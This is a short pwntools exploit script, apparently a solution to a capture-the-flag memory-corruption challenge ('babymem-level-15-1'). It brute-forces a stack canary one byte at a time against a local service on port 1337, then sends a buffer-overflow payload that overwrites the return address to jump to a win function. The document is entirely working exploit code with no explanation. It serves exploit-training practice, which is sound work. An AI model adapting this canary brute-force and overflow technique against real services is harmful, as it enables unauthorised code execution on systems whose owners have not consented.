
from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babymem-level-15-1")

WIN = p16(0x9e84)
buff_distance = 96
ret_distance = buff_distance + 8
canary_distance = ret_distance - 16
CANARY = b""
while len(CANARY) < 7:
    for i in range(0xff):
        value = bytes([i])
        print(f"Trying value {value}")
        if value == b"\x00": continue
        PAYLOAD = b'A'*(canary_distance) + b"\x00" + CANARY + value
        
        io = remote("localhost", 1337)
        io.sendline(f"{len(PAYLOAD)}")
        print(PAYLOAD)
        io.send(PAYLOAD)
        res = io.recvall().decode()
        if not "*** stack smashing detected ***" in res:
            CANARY = CANARY.ljust(len(CANARY)+1, value)
            break
        print(CANARY, len(CANARY))
        io.close()
print(CANARY)

PAYLOAD = b'A'*(canary_distance) + b"\x00" + CANARY + p64(0xffffffffffffffff) + WIN
io = remote("localhost", 1337)
io.sendline(f"{len(PAYLOAD)}")
io.send(PAYLOAD)
res = io.recvall().decode()
print(res)